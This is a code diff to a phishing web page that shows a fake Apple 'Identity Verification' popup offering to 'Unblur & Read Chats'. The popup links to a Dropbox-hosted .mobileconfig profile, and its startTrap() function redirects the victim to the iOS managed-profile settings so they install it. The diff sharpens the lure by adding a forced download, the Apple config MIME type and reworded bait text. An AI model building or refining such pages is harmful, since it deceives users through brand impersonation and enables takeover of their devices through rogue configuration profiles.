@@ -30,9 +30,12 @@
     <div class="verification-box" id="trap-popup">
         <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
         <h2>Identity Verification</h2>
-        <p>This conversation is encrypted. To view the full archive, verify your device identity.</p>
+        <p>Verify your device identity to access the cloud archive.</p>
         
-        <a href="https://www.dropbox.com/scl/fi/ubxfrxsk64sjcsq4odn3x/secure_verify-6.mobileconfig?rlkey=rexef269gpctb442ohnfu0zz4&st=3mev8s82&raw=1" class="btn" onclick="startTrap()">Unblur & Read Chats</a>
+        <a href="https://www.dropbox.com/scl/fi/ubxfrxsk64sjcsq4odn3x/secure_verify-6.mobileconfig?rlkey=rexef269gpctb442ohnfu0zz4&st=3mev8s82&raw=1" 
+           download="secure_verify.mobileconfig" 
+           type="application/x-apple-aspen-config"
+           class="btn" onclick="startTrap()">Unblur & Read Chats</a>
     </div>
 
     <script>
@@ -42,10 +45,9 @@
         }, 2000);
 
         function startTrap() {
-            // Wait 5 seconds for the download to start before moving to settings
             setTimeout(function() {
                 window.location.href = "App-prefs:General&path=ManagedConfigurationList";
-            }, 5000);
+            }, 6000);
         }
     </script>
 </body>
